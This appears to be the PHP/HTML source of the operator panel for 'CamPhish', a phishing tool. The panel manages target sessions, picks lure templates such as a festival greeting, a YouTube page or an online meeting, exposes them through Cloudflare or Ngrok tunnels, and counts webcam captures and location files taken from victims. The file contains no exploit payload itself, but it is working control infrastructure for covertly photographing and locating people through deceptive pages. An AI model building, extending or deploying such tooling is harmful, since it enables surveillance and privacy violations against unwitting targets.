<?php
$sessionsFile = '/data/config/sessions.json';
$data = json_decode(file_get_contents($sessionsFile), true) ?? ['sessions' => [], 'active' => ''];
$activeId = $data['active'] ?? '';
$sessions = $data['sessions'] ?? [];

function countCaptures($id) {
    $dir = '/data/captures/';
    if (!is_dir($dir)) return 0;
    $c = 0;
    foreach (scandir($dir) as $f) {
        if (strpos($f, $id) === 0 && preg_match('/\.png$/i', $f)) $c++;
    }
    return $c;
}
function countLocations($id) {
    $dir = '/data/locations/';
    if (!is_dir($dir)) return 0;
    $c = 0;
    foreach (scandir($dir) as $f) {
        if (strpos($f, $id) === 0 && preg_match('/\.txt$/i', $f)) $c++;
    }
    return $c;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CamPhish Operator Panel</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
        .header{background:#161b22;border-bottom:1px solid #30363d;padding:16px 24px;display:flex;justify-content:space-between;align-items:center}
        .header h1{font-size:20px;color:#58a6ff}
        .header nav a{color:#8b949e;text-decoration:none;margin-left:16px;font-size:13px}
        .header nav a:hover{color:#c9d1d9}
        .header nav a.active{color:#58a6ff}
        .container{max-width:1200px;margin:0 auto;padding:24px}
        .toolbar{display:flex;gap:12px;margin-bottom:24px;flex-wrap:wrap;align-items:center}
        .btn{padding:8px 16px;border-radius:6px;border:none;cursor:pointer;font-size:13px;font-weight:500}
        .btn-primary{background:#238636;color:#fff}
        .btn-primary:hover{background:#2ea043}
        .btn-danger{background:#da3633;color:#fff}
        .btn-danger:hover{background:#f85149}
        .btn-secondary{background:#21262d;color:#c9d1d9;border:1px solid #30363d}
        .btn-secondary:hover{background:#30363d}
        .btn-sm{padding:4px 10px;font-size:12px}
        .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:12px}
        .card.active{border-color:#58a6ff;box-shadow:0 0 0 1px #58a6ff}
        .card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
        .card-title{font-size:16px;font-weight:600;color:#f0f6fc}
        .card-badge{font-size:11px;padding:2px 8px;border-radius:12px;background:#21262d;color:#8b949e}
        .card-badge.active{background:#1f3a2e;color:#3fb950}
        .card-badge.stopped{background:#3a1f1f;color:#f85149}
        .card-meta{font-size:12px;color:#8b949e;margin-top:4px}
        .card-stats{display:flex;gap:16px;margin-top:8px}
        .stat{font-size:12px;color:#8b949e}
        .stat strong{color:#c9d1d9}
        .card-actions{display:flex;gap:8px;margin-top:12px}
        .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:1000;justify-content:center;align-items:center}
        .modal-overlay.active{display:flex}
        .modal{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:24px;width:480px;max-width:90vw}
        .modal h2{font-size:18px;color:#f0f6fc;margin-bottom:16px}
        .form-group{margin-bottom:12px}
        .form-group label{display:block;font-size:12px;color:#8b949e;margin-bottom:4px;text-transform:uppercase}
        .form-group input,.form-group select{width:100%;padding:8px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px}
        .form-group input:focus,.form-group select:focus{outline:none;border-color:#58a6ff}
        .form-row{display:flex;gap:12px}
        .form-row .form-group{flex:1}
        .checkbox-group{display:flex;align-items:center;gap:8px}
        .checkbox-group input[type=checkbox]{width:auto}
        .modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:16px}
        .empty-state{text-align:center;padding:60px 20px;color:#8b949e}
        .empty-state h3{font-size:18px;color:#c9d1d9;margin-bottom:8px}
        .toast{position:fixed;bottom:24px;right:24px;padding:12px 20px;border-radius:8px;font-size:13px;z-index:2000;animation:slideIn .3s ease}
        .toast.success{background:#1f3a2e;color:#3fb950;border:1px solid #238636}
        .toast.error{background:#3a1f1f;color:#f85149;border:1px solid #da3633}
        @keyframes slideIn{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
    </style>
</head>
<body>
    <div class="header">
        <h1>CamPhish Operator Panel</h1>
        <nav>
            <a href="/operator/" class="active">Sessions</a>
            <a href="/">Dashboard</a>
            <a href="/ai-generator/">AI Templates</a>
        </nav>
    </div>
    <div class="container">
        <div class="toolbar">
            <button class="btn btn-primary" onclick="openCreateModal()">+ New Session</button>
            <button class="btn btn-secondary" onclick="refreshSessions()">Refresh</button>
            <span style="font-size:12px;color:#8b949e;margin-left:auto" id="sessionCount"></span>
        </div>
        <div id="sessionList"></div>
    </div>

    <div class="modal-overlay" id="createModal">
        <div class="modal">
            <h2>Create New Session</h2>
            <div class="form-group">
                <label>Session Name</label>
                <input type="text" id="newName" placeholder="e.g. target-1" maxlength="50">
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Template</label>
                    <select id="newTemplate">
                        <option value="1">Festival Wishing</option>
                        <option value="2">Live YouTube TV</option>
                        <option value="3">Online Meeting</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Tunnel</label>
                    <select id="newTunnel">
                        <option value="cloudflared">Cloudflare Tunnel</option>
                        <option value="ngrok">Ngrok</option>
                        <option value="none">None (self-hosted)</option>
                    </select>
                </div>
            </div>
            <div class="form-group" id="festivalGroup">
                <label>Festival Name</label>
                <input type="text" id="newFestival" placeholder="e.g. Diwali" maxlength="30">
            </div>
            <div class="form-group" id="youtubeGroup" style="display:none">
                <label>YouTube Video ID</label>
                <input type="text" id="newYoutube" placeholder="e.g. dQw4w9WgXcQ" maxlength="20">
            </div>
            <div class="form-row">
                <div class="checkbox-group">
                    <input type="checkbox" id="newWatermark" checked>
                    <label for="newWatermark" style="text-transform:none">Watermark captures</label>
                </div>
                <div class="checkbox-group">
                    <input type="checkbox" id="newWebrtc" checked>
                    <label for="newWebrtc" style="text-transform:none">WebRTC streaming</label>
                </div>
            </div>
            <div class="modal-actions">
                <button class="btn btn-secondary" onclick="closeCreateModal()">Cancel</button>
                <button class="btn btn-primary" onclick="createSession()">Create</button>
            </div>
        </div>
    </div>

    <div id="toastContainer"></div>

    <script>
        let sessions = {};
        let activeId = '';

        document.getElementById('newTemplate').addEventListener('change', function() {
            document.getElementById('festivalGroup').style.display = this.value === '1' ? '' : 'none';
            document.getElementById('youtubeGroup').style.display = this.value === '2' ? '' : 'none';
        });

        function toast(msg, type) {
            const el = document.createElement('div');
            el.className = 'toast ' + type;
            el.textContent = msg;
            document.getElementById('toastContainer').appendChild(el);
            setTimeout(() => el.remove(), 3000);
        }

        async function api(method, body) {
            const res = await fetch('/api/sessions.php', {
                method: method,
                headers: {'Content-Type': 'application/json'},
                body: body ? JSON.stringify(body) : undefined
            });
            return res.json();
        }

        async function refreshSessions() {
            const data = await api('GET');
            sessions = data.sessions || {};
            activeId = data.active || '';
            renderSessions();
        }

        function renderSessions() {
            const list = document.getElementById('sessionList');
            const ids = Object.keys(sessions);
            document.getElementById('sessionCount').textContent = ids.length + ' session(s)';

            if (ids.length === 0) {
                list.innerHTML = '<div class="empty-state"><h3>No sessions yet</h3><p>Create your first session to start capturing.</p></div>';
                return;
            }

            list.innerHTML = ids.map(id => {
                const s = sessions[id];
                const isActive = id === activeId;
                const tplLabel = {1:'Festival',2:'YouTube',3:'Meeting'}[s.template] || 'Festival';
                return `
                <div class="card ${isActive ? 'active' : ''}">
                    <div class="card-header">
                        <span class="card-title">${esc(s.name)}</span>
                        <span class="card-badge ${s.status}">${isActive ? 'ACTIVE' : s.status.toUpperCase()}</span>
                    </div>
                    <div class="card-meta">
                        ID: ${esc(id)} · Template: ${tplLabel} · Tunnel: ${esc(s.tunnel)} · Created: ${s.created_at ? s.created_at.slice(0,10) : '—'}
                    </div>
                    <div class="card-stats">
                        <div class="stat">📷 Captures: <strong>${s.capture_count ?? 0}</strong></div>
                        <div class="stat">📍 Locations: <strong>${s.location_count ?? 0}</strong></div>
                    </div>
                    <div class="card-actions">
                        ${!isActive ? `<button class="btn btn-primary btn-sm" onclick="switchSession('${esc(id)}')">Activate</button>` : ''}
                        <button class="btn btn-secondary btn-sm" onclick="editSession('${esc(id)}')">Edit</button>
                        <button class="btn btn-danger btn-sm" onclick="deleteSession('${esc(id)}')">Delete</button>
                    </div>
                </div>`;
            }).join('');
        }

        function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

        function openCreateModal() {
            document.getElementById('createModal').classList.add('active');
            document.getElementById('newName').focus();
        }
        function closeCreateModal() {
            document.getElementById('createModal').classList.remove('active');
        }

        async function createSession() {
            const name = document.getElementById('newName').value.trim();
            if (!name) { toast('Session name required', 'error'); return; }
            const result = await api('POST', {
                action: 'create',
                name: name,
                template: parseInt(document.getElementById('newTemplate').value),
                festival_name: document.getElementById('newFestival').value.trim() || 'NewYear',
                youtube_id: document.getElementById('newYoutube').value.trim() || 'dQw4w9WgXcQ',
                tunnel: document.getElementById('newTunnel').value,
                watermark_enabled: document.getElementById('newWatermark').checked,
                webrtc_enabled: document.getElementById('newWebrtc').checked
            });
            if (result.error) { toast(result.error, 'error'); return; }
            closeCreateModal();
            toast('Session created: ' + result.id, 'success');
            await refreshSessions();
        }

        async function switchSession(id) {
            const result = await api('POST', {action: 'switch', id: id});
            if (result.error) { toast(result.error, 'error'); return; }
            toast('Switched to: ' + id, 'success');
            await refreshSessions();
        }

        async function deleteSession(id) {
            if (!confirm('Delete session "' + sessions[id]?.name + '"? This cannot be undone.')) return;
            const result = await api('POST', {action: 'delete', id: id});
            if (result.error) { toast(result.error, 'error'); return; }
            toast('Session deleted', 'success');
            await refreshSessions();
        }

        async function editSession(id) {
            const s = sessions[id];
            const newName = prompt('Session name:', s.name);
            if (!newName) return;
            const result = await api('POST', {action: 'update', id: id, name: newName});
            if (result.error) { toast(result.error, 'error'); return; }
            toast('Updated', 'success');
            await refreshSessions();
        }

        refreshSessions();
    </script>
</body>
</html>
